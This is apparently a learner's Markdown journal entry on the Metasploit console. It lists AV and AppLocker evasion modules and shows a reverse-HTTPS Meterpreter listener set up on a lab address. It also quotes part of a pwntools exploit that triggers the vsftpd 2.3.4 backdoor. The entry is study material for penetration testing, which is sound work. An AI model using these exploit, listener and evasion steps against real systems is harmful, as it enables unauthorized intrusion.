# Day 16 — Metasploit Framework
[← Back to overview](README.md)

## Meet the Framework
Day 16 moved from theory (reverse shells, staged payloads) into the tool that ties it all together: the
**Metasploit Framework**, launched via its interactive console, `msfconsole`.

```bash
msfconsole
```
Startup banner confirms the current build and gives a live count of what's bundled:

```
   =[ metasploit v6.4.15-dev-                        ]
+ -- --=[ 2433 exploits - 1253 auxiliary - 428 post   ]
+ -- --=[ 1471 payloads - 47 encoders - 11 nops       ]
+ -- --=[ 9 evasion                                   ]

Metasploit Documentation: https://docs.metasploit.com/

msf6 >
```

| Component | Count | Purpose |
|---|---|---|
| Exploits | 2433 | Modules that actively take advantage of a specific vulnerability. |
| Auxiliary | 1253 | Supporting modules — scanners, fuzzers, DoS, protocol tools (non-exploit). |
| Post | 428 | Post-exploitation modules — run *after* a session is already established. |
| Payloads | 1471 | The code delivered once an exploit succeeds (shells, Meterpreter, etc.). |
| Encoders | 47 | Obfuscate a payload to dodge signature-based AV/IDS detection. |
| Nops | 11 | No-operation sled generators, used to pad/align exploit buffers. |
| Evasion | 9 | Dedicated modules built specifically to slip past AV/EDR products. |

Metasploit also randomizes a small "tip" and an ASCII-art banner (a `cowsay`-style Easter egg) on every launch —
harmless, but a nice reminder the framework has been under continuous community development for two decades.

## Exploring Modules — `show evasion`
```
msf6 > show evasion
```
| # | Name | Rank | Check | Description |
|---|---|---|---|---|
| 0 | evasion/windows/applocker_evasion_install_util | normal | No | Applocker Evasion - .NET Framework Installation Utility |
| 1 | evasion/windows/applocker_evasion_msbuild | normal | No | Applocker Evasion - MSBuild |
| 2 | evasion/windows/applocker_evasion_presentationhost | normal | No | Applocker Evasion - Windows Presentation Foundation Host |
| 3 | evasion/windows/applocker_evasion_regasm_regsvcs | normal | No | Applocker Evasion - Microsoft .NET Assembly Registration Utility |
| 4 | evasion/windows/applocker_evasion_workflow_compiler | normal | No | Applocker Evasion - Microsoft Workflow Compiler |
| 5 | evasion/windows/process_herpaderping | normal | No | Process Herpaderping evasion technique |
| 6 | evasion/windows/syscall_inject | normal | No | Direct windows syscall evasion technique |
| 7 | evasion/windows/windows_defender_exe | normal | No | Microsoft Windows Defender Evasive Executable |
| 8 | evasion/windows/windows_defender_js_hta | normal | No | Microsoft Windows Defender Evasive JS.Net and HTA |

This is `show <module_type>` syntax at work — the same command works for `show exploits`, `show payloads`,
`show auxiliary`, `show post`, and `show encoders` to browse each category.

## Setting Up a Handler — `exploit/multi/handler`
`multi/handler` is Metasploit's generic **listener** module — it doesn't attack anything itself, it just waits for a
payload (already delivered by some other means) to call back.

```
msf6 > use exploit/multi/handler
msf6 exploit(multi/handler) > set payload windows/meterpreter/reverse_https
payload ⇒ windows/meterpreter/reverse_https
msf6 exploit(multi/handler) > set LHOST 192.168.29.160
LHOST ⇒ 192.168.29.160
msf6 exploit(multi/handler) > set LPORT 4444
LPORT ⇒ 4444
msf6 exploit(multi/handler) > exploit

[*] Started HTTPS reverse handler on https://192.168.29.160:4444
```
The handler is now sitting idle, listening for an inbound HTTPS connection from any host that's been given a matching
`windows/meterpreter/reverse_https` payload with the same LHOST/LPORT — the exact pattern completed end-to-end on
Day 17.

## Revisiting the vsftpd Research
Alongside learning the console, the vsftpd 2.3.4 backdoor research from Day 14 continued in parallel — reading the
Rapid7 module page for `unix/ftp/vsftpd_234_backdoor`, the NVD detail page for **CVE-2011-2523**, and the raw exploit
source on GitHub (`HellesenderD1/vsftpd_2.3.4_Exploit/exploit.py`, 45 lines) to fully understand what the Metasploit
module (`exploit/unix/ftp/vsftpd_234_backdoor`) does internally before firing it:
```python
#!/usr/bin/python3

from pwn import *
import sys
from time import sleep

class ExploitFTP:
    def __init__(self, ip, port=21):
        self.ip = ip
        self.port = port
        self.log = log.progress("...")

    def trigger_backdoor(self):
        self.p.status("Checking Version...")
        io = remote(self.p.ip, self.p.port)
        io.recvuntil(b"vsftpd ")
        version = (io.recvuntil(b"\r\n")[:-2]).decode()
        if version != "2.3.4":
            self.p.failure("Version(\"{}\") Not Found 2.3.4!!!".format(version))
            exit()
        else:
            self.p.status("Triggering Backdoor.....")
        io.sendline(b"USER hello:)")
        io.sendline(b"PASS hello123")
```

## Why It Matters
`msfconsole` is the control plane for everything from here on: search, `use`, `set`, `exploit` becomes the standard
loop for every module in the framework, whether it's an exploit, an auxiliary scanner, or (as above) just a listener
waiting patiently for a payload generated elsewhere. Understanding `multi/handler` specifically is the piece that
connects `msfvenom`-generated payloads (Day 15) to a live, interactive Meterpreter session (Day 17).

## 🧠 Quick Revision Questions
1. What's the difference between an `exploit` module and an `auxiliary` module in Metasploit?
2. Why does `exploit/multi/handler` need a payload set on it if it isn't delivering the payload itself?
3. Why review a module's underlying exploit code/CVE before running it, even though Metasploit already vetted it?

## 🔑 New Glossary Terms
- **msfconsole** — Metasploit's primary interactive command-line interface.
- **multi/handler** — a generic Metasploit listener module for catching any staged/stageless payload callback.
- **Encoder** — a Metasploit module that transforms a payload's byte signature to help evade detection.
- **CVE-2011-2523** — the CVE identifier for the vsftpd 2.3.4 backdoor.

---
[← Day 15](day15.md) | [Back to overview](README.md) | [Next: Day 17 →](day17.md)
